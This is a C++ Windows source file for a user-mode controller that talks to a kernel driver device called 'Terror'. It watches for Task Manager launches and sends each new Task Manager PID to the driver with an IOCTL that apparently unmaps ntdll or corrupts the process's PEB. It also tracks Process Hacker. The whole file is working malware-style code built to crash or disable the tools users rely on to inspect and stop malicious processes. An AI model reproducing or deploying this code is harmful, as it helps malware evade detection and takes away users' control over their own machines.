#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <set>

HANDLE hDevice;

std::set<DWORD> taskmanagerPIDlist;

#define IO_UNMAP_NTDLL CTL_CODE(FILE_DEVICE_UNKNOWN, 0x111, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_CORRUPT_PEB CTL_CODE(FILE_DEVICE_UNKNOWN, 0x222, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)



bool CreateHandle()
{
	hDevice = CreateFileW(L"\\\\.\\Terror", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << "Handle creation failed\n";
		std::cin.get();
		return false;
	}

	std::cout << "Handle creation successful\n";

	return true;
}



const wchar_t* taskManagerName = L"Taskmgr.exe";
const wchar_t* processHackerName = L"ProcessHacker.exe";

int processHackerPID;
int taskManagerPID;

DWORD ctlcode;


DWORD GetProcess()
{
	HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshotHandle == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	PROCESSENTRY32W processEntry = { };
	processEntry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(snapshotHandle, &processEntry))
	{

		do
		{
			if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
			{

				if (_wcsicmp(processEntry.szExeFile, taskManagerName) == 0)
				{
					DWORD pid = processEntry.th32ProcessID;

					if (taskmanagerPIDlist.find(pid) == taskmanagerPIDlist.end())
					{
						printf("[+] Task manager launched: %lu\n", pid);
						taskmanagerPIDlist.insert(pid);
						taskManagerPID = pid;

						if (!DeviceIoControl(hDevice, ctlcode, &pid, sizeof(pid), NULL, 0, NULL, NULL))
						{
							printf("DeviceIoControl failed for PID %lu with error %lu\n", pid, GetLastError());
						}

					}
				}

			}
			if (_wcsicmp(processEntry.szExeFile, processHackerName) == 0)
			{

				if (processHackerPID != processEntry.th32ProcessID)
				{
					printf("[+] ProcessHacker launched: %i\n", processEntry.th32ProcessID);
					processHackerPID = processEntry.th32ProcessID;
				}
			}

		} while (Process32NextW(snapshotHandle, &processEntry));
	}

	CloseHandle(snapshotHandle);
	return NULL;
}



int main()
{


	if (!CreateHandle())
	{
		printf("failed to create handle:  %i\r\n", GetLastError());
	}


	while (true)
	{
		int code;
		std::cin >> code;

		if (code == 1)
		{
			ctlcode = IO_UNMAP_NTDLL;
			break;
		}
		else if (code == 2)
		{
			ctlcode = IO_CORRUPT_PEB;
			break;
		}
		else
		{
			printf("Wrong input\n");
		}
	}

	while (true)
	{
		GetProcess();

		Sleep(100);
	}


	CloseHandle(hDevice);

	system("PAUSE");


}